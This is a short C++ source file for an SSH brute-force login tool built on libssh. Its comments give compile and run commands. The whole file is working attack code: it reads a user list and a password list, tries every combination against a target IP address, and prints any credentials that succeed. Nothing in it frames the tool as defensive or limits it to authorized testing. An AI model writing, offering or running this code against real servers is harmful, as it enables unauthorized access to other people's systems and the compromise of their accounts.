// Compile: g++ -o ssh_brute ssh_brute.cpp -lssh
// Run: ./ssh_brute <target_ip> <userlist> <passlist>
// Requires: libssh-dev

#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <libssh/libssh.h>

class SSHBruteForce {
private:
    std::string target;
    
public:
    SSHBruteForce(const std::string& t) : target(t) {}
    
    bool tryCredential(const std::string& user, const std::string& pass) {
        ssh_session session = ssh_new();
        if (!session) return false;
        
        ssh_options_set(session, SSH_OPTIONS_HOST, target.c_str());
        ssh_options_set(session, SSH_OPTIONS_USER, user.c_str());
        
        if (ssh_connect(session) != SSH_OK) {
            ssh_free(session);
            return false;
        }
        
        int rc = ssh_userauth_password(session, NULL, pass.c_str());
        ssh_disconnect(session);
        ssh_free(session);
        
        return rc == SSH_AUTH_SUCCESS;
    }
    
    void brute(const std::vector<std::string>& users, 
               const std::vector<std::string>& passwords) {
        for (const auto& user : users) {
            for (const auto& pass : passwords) {
                std::cout << "[*] Trying " << user << ":" << pass << std::endl;
                if (tryCredential(user, pass)) {
                    std::cout << "[+] Found: " << user << ":" << pass << std::endl;
                    return;
                }
            }
        }
    }
};

int main(int argc, char* argv[]) {
    if (argc != 4) { std::cerr << "Usage: " << argv[0] << " <ip> <users> <passwords>\n"; return 1; }
    
    std::vector<std::string> users, passwords;
    std::ifstream uf(argv[2]), pf(argv[3]);
    std::string line;
    while (std::getline(uf, line)) users.push_back(line);
    while (std::getline(pf, line)) passwords.push_back(line);
    
    SSHBruteForce brute(argv[1]);
    brute.brute(users, passwords);
    return 0;
}